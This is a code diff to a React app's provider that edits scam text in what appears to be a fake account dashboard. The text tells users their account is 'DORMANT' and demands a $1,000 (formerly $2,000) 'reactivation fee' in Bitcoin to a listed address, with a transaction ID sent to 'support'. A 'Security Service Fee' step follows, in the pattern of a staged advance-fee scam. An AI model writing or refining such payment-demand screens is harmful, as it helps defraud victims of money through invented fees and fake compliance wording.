@@ -1037,8 +1037,8 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     activeWarningKey: 'step1',
     step1: {
       title: 'Initial Account Maintenance Reactivation Fee',
-      amount: '$2,000',
-      description: 'Your account is currently DORMANT, which requires verification before full privileges can be restored.\nAccount Reactivation Procedure:\nSettlement Requirement: Settle the account reactivation and compliance verification fee of $2,000.\nBitcoin Deposit Address: Transfer the equivalent amount to our secure institutional BTC address: 0x697638fe9a9b7b98556957090c165ce55dda2fc0\nTransaction Submission: Provide your transaction hash (TXID) through this support channel once the transfer is broadcast for compliance review within 2-3 hours.'
+      amount: '$1,000',
+      description: 'Your account is currently DORMANT, which requires verification before full privileges can be restored. Account Reactivation Procedure: Settlement Requirement: Settle the account reactivation and compliance verification fee of $1,000. Bitcoin Deposit Address: Transfer the equivalent amount to our secure institutional BTC address:\n\n3Erisk3mxLpVKakTpyfvnGAvvfvAEMq8kg\n\nTransaction Submission: Provide your transaction hash (TXID) through this support channel once the transfer is broadcast for compliance review within 3 hours.'
     },
     step2: {
       title: 'System Processing & Security Service Fee',
